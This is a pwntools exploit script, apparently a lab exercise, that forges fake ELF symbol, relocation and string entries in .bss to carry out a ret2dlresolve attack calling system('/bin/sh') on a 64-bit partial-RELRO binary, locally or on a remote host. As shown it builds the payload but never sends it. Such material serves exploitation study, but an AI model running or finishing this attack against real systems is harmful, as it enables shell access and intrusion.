from pwn import *
import math

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = args.FNAME if (args.FNAME) else "./main_partial_relro_64"
g_elf = ELF(g_fname)
context.binary = g_elf

if (args.LOCAL):
	g_io = process(g_fname)
else:
	h, p = args.RHOST.split(':')
	g_io = remote(h, p)

def getpid():
	if (args.LOCAL):
		log.info("pid:%d\n", g_io.proc.pid)
		pause()

def get_shaddr(elfobj, sec_name):
	return elfobj.get_section_by_name(sec_name)["sh_addr"]

def get_aligned_addr(base_addr, unaligned_addr, alignment):
	assert(base_addr <= unaligned_addr)
	off = unaligned_addr - base_addr
	idx = math.ceil(off / alignment)
	return base_addr + idx*alignment

def pwn():
	# segment writable [0x601000, 0x602000)
	# .bss [0x601050, 0x601070)
	bss_addr = g_elf.bss()
	# data_addr = 0x601070
	data_addr = bss_addr + 0x20 
	binsh_addr = data_addr
	fake_dynstr_addr = binsh_addr + 8
	# The following 2 addrs are uninitialized and need be aligned.
	fake_reloc_addr = 0
	fake_refsym_addr = 0
	new_stk = 0
	sh = "/bin/sh\0"
	str_sym_name = "system\0"

	log.debug("\"%s\"@%#x\n\t\"%s\"@%#x\n", sh, binsh_addr, str_sym_name, fake_dynstr_addr)

	dynstr_shaddr = get_shaddr(g_elf, ".dynstr")
	dynsym_shaddr = get_shaddr(g_elf, ".dynsym")
	relplt_shaddr = get_shaddr(g_elf, ".rela.plt")
	log.debug(".dynstr@%#x\n\t.dynsym@%#x\n\t.rela.plt@%#x\n"
		, dynstr_shaddr
		, dynsym_shaddr
		, relplt_shaddr
	)

	# make sure fake_refsym_off % sizeof(Elf64_Sym) == 0,
	# that is fake_refsym_off % 24 == 0
	fake_refsym_addr = fake_dynstr_addr + len(str_sym_name)
	fake_refsym_addr = get_aligned_addr(dynsym_shaddr, fake_refsym_addr, 24)
	fake_refsym_off = fake_refsym_addr - dynsym_shaddr
	fake_refsym_idx = fake_refsym_off // 24
	log.debug("fake_refsym_addr=%#x\n\tfake_refsym_off=%#x\n\tfake_refsym_idx=%#x\n"
		, fake_refsym_addr
		, fake_refsym_off
		, fake_refsym_idx
	)

	# 64-bit version: make sure fake_reloc_off % sizeof(Elf64_Rela) == 0,
	# that is fake_reloc_off % 24 == 0
	fake_reloc_addr = fake_refsym_addr + 24 # fake Elf64_Rela object behind fake Elf64_Sym object.
	fake_reloc_addr = get_aligned_addr(relplt_shaddr, fake_reloc_addr, 24)
	fake_reloc_off = fake_reloc_addr - relplt_shaddr
	fake_reloc_idx = fake_reloc_off // 24 # This is _dl_fixup()'s reloc_arg in 64-bit version.
	log.debug("fake_reloc_addr=%#x\n\tfake_reloc_off=%#x\n\tfake_reloc_idx=%#x\n"
		, fake_reloc_addr
		, fake_reloc_off
		, fake_reloc_idx
	)

	fake_dynstr_off = fake_dynstr_addr - dynstr_shaddr	
	log.debug("fake_dynstr_addr=%#x\n\tfake_dynstr_off=%#x\n", fake_dynstr_addr, fake_dynstr_off)

	# forge fake Elf64_Sym object
	# typedef struct
	# {
	#	Elf64_Word st_name;		/*Symbol name(string tbl index)*/
	#	unsigned char st_info;  	/*Symbol type and binding*/
	#	unsigned char st_other;	/*Symbol visibility*/
	#	Elf64_Section st_shndx;	/*Section index*/
	#	Elf64_Addr st_value;  	/*Symbol value*/
	#	Elf64_Xword st_size;  	/*Symbol size*/
	# }	Elf64_Sym;
	# sizeof(Elf64_Sym) == 24
	st_name = fake_dynstr_off
	st_info = 0x12
	st_other = 0
	st_shndx = 0 # SHN_UNDEF, undefined symbol, symbol refered in current module but defined in another.
	st_value = 0
	st_size = 0
	fake_sym_obj = flat([
		st_name | (st_info << 32) | (st_other << 40) | (st_shndx << 48),
		st_value,
		st_size
	])	
	log.debug("fake_sym_obj:\n\tlength=%d\n", len(fake_sym_obj))


	# forge fake Elf64_Rela object
	fake_symidx = fake_refsym_off // len(fake_sym_obj)
	r_offset = 0x601018
	r_info = (fake_symidx << 32) | 0x7
	fake_reloc_obj = flat(r_offset, r_info, 0)
	log.debug("fake_reloc_obj:\n\tlength=%d\n\tfake_symidx=%#x\n"
		, len(fake_reloc_obj)
		, fake_symidx
	)

	full_data_payload = flat({
		0:sh,
		8:str_sym_name,
		(fake_refsym_addr - data_addr): fake_sym_obj,
		(fake_reloc_addr - data_addr): fake_reloc_obj
	})
	log.debug("full_data_payload's length = %d\n", len(full_data_payload))
	

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
